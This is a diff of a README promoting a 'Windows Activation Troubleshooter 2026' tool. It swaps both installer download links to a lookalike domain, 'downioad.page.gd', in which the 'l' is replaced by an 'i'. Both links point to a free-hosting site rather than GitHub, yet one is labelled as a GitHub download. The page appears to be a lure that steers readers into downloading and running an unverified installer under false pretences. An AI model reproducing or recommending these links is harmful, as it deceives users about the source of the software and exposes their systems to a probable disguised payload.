@@ -2,7 +2,7 @@
 
 Windows Activation Troubleshooter 2026 is a powerful and easy-to-use utility designed to help users resolve activation errors on Windows 10 and 11 systems. This tool automatically detects activation issues and provides step-by-step solutions to ensure your Windows remains activated and secure. Whether you're facing common error codes or unexpected activation failures, this troubleshooter offers a seamless experience to get your system back on track.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ Yes, the Windows Activation Troubleshooter is completely free for personal and n
 
 For the latest version and updates, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
